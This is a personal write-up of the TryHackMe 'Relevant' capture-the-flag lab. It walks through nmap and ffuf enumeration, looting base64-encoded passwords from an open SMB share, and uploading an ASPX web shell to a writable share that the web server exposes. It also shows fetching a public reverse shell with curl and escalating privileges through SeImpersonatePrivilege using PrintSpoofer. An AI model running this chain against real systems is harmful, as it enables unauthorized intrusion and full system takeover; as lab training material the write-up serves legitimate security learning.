*2021-09-01*

*kimm3*

# Walkthrough: Relevant
Platform: TryHackMe

Difficulty: Medium

- [Link](https://tryhackme.com/room/relevant)

![info](assets/markdown-img-paste-20210901092531964.png)
## Setup
![ll](assets/markdown-img-paste-20210826112245589.png)

```
script history
export IP=10.10.96.187
ping $IP
```

(Machine responds to ICMP)

(Had to reset the machine due to it freezin up, so IP changes in the walkthrough.)
## Scans and enumeration
`sudo nmap $IP -p- -Pn -A -oA scans/nmap-init`

![nmap-init](assets/markdown-img-paste-2021090109333615.png)

A windows machine, no domain, computer name 'relevant'. IIS server at 80 (and maybe at 49663?), smb(2) enabled and a rdp service at 3389. Let' start exploring.

### http
![index-p80](assets/markdown-img-paste-20210901093520970.png)

Standard IIS page at port 80 and the same at 49663. This threw me off for quite some time because that port didn't respond at first. This happened a few time during the box, had to reset it to get it working again.

![notresponding](assets/markdown-img-paste-20210901113429663.png)


### smb
`smbclient -N -L $IP | tee scans/smblist.txt`

![smbinit](assets/markdown-img-paste-20210901093649815.png)

```
smbclient -Nv //$IP/nt4wrksv
dir
lcd foundfiles
get passwords.txt
```

![smbpasswords](assets/markdown-img-paste-20210901093917329.png)

![passwordtxt](assets/markdown-img-paste-20210901094017266.png)

Encoded passwords. Luckily for us, encoded with base64.

![decodedpw](assets/markdown-img-paste-20210901094159643.png)

### rdp
Let's give that rdp service a try with these credentials.

```
xfreerdp /u:Bob /p:!P@$$W0rD!123 /v:$IP
xfreerdp /u:Bill /p:'Juw4nnaM4n420696969!$$$' /v:10.10.96.187:3389
```

![bob-failed](assets/markdown-img-paste-20210901094946345.png)

![bill-expiredpw](assets/markdown-img-paste-20210901095005938.png)

Not sure if rdp knowledge is inadequate or if they don't have permissions/expired passwords. Letting that one go for now.

### futher http
Nothing too obviouis so far, so I'm gonna start scanning the webservers - they have to be there for a reason.

```
sudo nmap $IP -p 80 --script http-enum,http-iis-short-name-brute -oA scans/nmap-http80
ffuf -u "http://10.10.60.134/FUZZ" -w sl/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -of md -o scans/ffuf-indexdirp80'
ffuf -u "http://10.10.60.134:49663/FUZZ" -w sl/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -of md -o scans/ffuf-indexdirp49663'
```

Nothing.

I'm going to do som really wide searches - adding a bigger list combined with a lot of extensions. I'll let them run in the background and read up on rdp and smb while it's going.

```
ffuf -u "http://10.10.60.134/FUZZ" -w sl/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -of md -o scans/ffuf-indexdir-med-ext-p80 -e $(cat tools/webext.txt)
ffuf -u "http://10.10.60.134:49663/FUZZ" -w sl/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -of md -o scans/ffuf-indexdir-med-ext-p49663 -e $(cat tools/webext.txt)
```

![dirfound](assets/markdown-img-paste-20210901121328826.png)

We can browse to the address but it's empty. The folder is the same as the smb share, we can view the 'passwords.txt' in the browser. Starting another scan to recurse one level down, meanwhile I'm gonna see if that share is writeable.

![passwordstxtagain](assets/markdown-img-paste-20210901123452456.png)

```
ffuf -u "http://10.10.202.156:49663/nt4wrksv/FUZZ" -w sl/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -e html,php -of md -o scans/ffuf-nt4wrks-dir-p49663
```
## Foothold/Exploit
If we have write permission on the share, we have good chances on getting us a reverse shell.

![echohejtest](assets/markdown-img-paste-20210901123514930.png)

![testtxtbrowse](assets/markdown-img-paste-20210901123601980.png)

Yup. If we can find a protocol that works(like PHP or aspx) we can put a payload/revshell on the server and execute it.

First try: php, didn't work. Then I tried the cmdasp.aspx.

![whoami](assets/markdown-img-paste-20210901125853782.png)

Works, let's get a proper shell instead.

`curl "https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx" > upload/shell.aspx`

![usertxt](assets/markdown-img-paste-20210901130031410.png)

It works and we can get to Bobs desktop to get 'user.test'.

## Privilege Escalation
![uploadfolder](assets/markdown-img-paste-20210901130252373.png)

We have at least one folder we know that we can upload stuff to, let's use winPEAS and output a file in that folder so that we can retrieve for analysis on our local machine.

![seimpersenabled](assets/markdown-img-paste-2021090123014293.png)

Seems that the SeImpersonatePrivilege token is enabled. Text from hacktricks:

![seimpersonateinfo](assets/markdown-img-paste-20210901164331893.png)

I tried the JuicyPotato first, but I think AV might have grabbed it. It didn't run and then it got removed. The Printspoofer however, worked.

![roottxt](assets/markdown-img-paste-20210901163230807.png)

More info on the subject:
- https://github.com/itm4n/PrintSpoofer
- https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
- https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
